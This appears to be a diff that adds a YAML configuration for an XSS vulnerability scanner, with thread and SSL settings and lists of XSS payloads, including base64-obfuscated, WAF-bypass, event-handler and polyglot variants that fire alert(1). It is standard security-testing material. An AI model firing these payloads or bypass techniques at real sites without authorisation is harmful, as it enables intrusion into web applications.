@@ -1,0 +1,67 @@
+# XSS Scanner Configuration
+
+# Scanner Settings
+scanner:
+  max_threads: 10
+  timeout: 30
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+  follow_redirects: true
+  verify_ssl: false
+
+# Payload Categories
+payloads:
+  # Basic XSS payloads
+  basic:
+    - '<script>alert(1)</script>'
+    - '"><script>alert(1)</script>'
+    - '"><img src=x onerror=alert(1)>'
+    - '"><svg/onload=alert(1)>'
+    - 'javascript:alert(1)'
+
+  # DOM-based XSS payloads
+  dom:
+    - '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
+    - '"><svg/onload=eval(atob("YWxlcnQoMSk="))>'
+    - '"><script>eval(atob("YWxlcnQoMSk="))</script>'
+
+  # WAF bypass payloads
+  waf_bypass:
+    - '<scr<script>ipt>alert(1)</scr</script>ipt>'
+    - '<scr\x00ipt>alert(1)</scr\x00ipt>'
+    - '<scr\x0Aipt>alert(1)</scr\x0Aipt>'
+    - '<scr\x0Dipt>alert(1)</scr\x0Dipt>'
+    - '<scr\x09ipt>alert(1)</scr\x09ipt>'
+
+  # Event-based XSS payloads
+  event:
+    - '"><img src=x onerror=alert(1)>'
+    - '"><body onload=alert(1)>'
+    - '"><input onfocus=alert(1) autofocus>'
+    - '"><select onmouseover=alert(1)>'
+
+  # Polyglot XSS payloads
+  polyglot:
+    - 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//<stYle/onload=alert()>//'
+    - '"><img src=x onerror=alert(1)><img src=x onerror=alert(1)>'
+
+# WAF Bypass Techniques
+waf_bypass:
+  encoding:
+    - url
+    - html
+    - base64
+    - hex
+    - unicode
+  obfuscation:
+    - mixed_case
+    - null_bytes
+    - whitespace
+    - comments
+
+# Reporting
+reporting:
+  output_format: json
+  include_headers: true
+  include_response: false
+  save_screenshots: false
+  log_level: INFO 
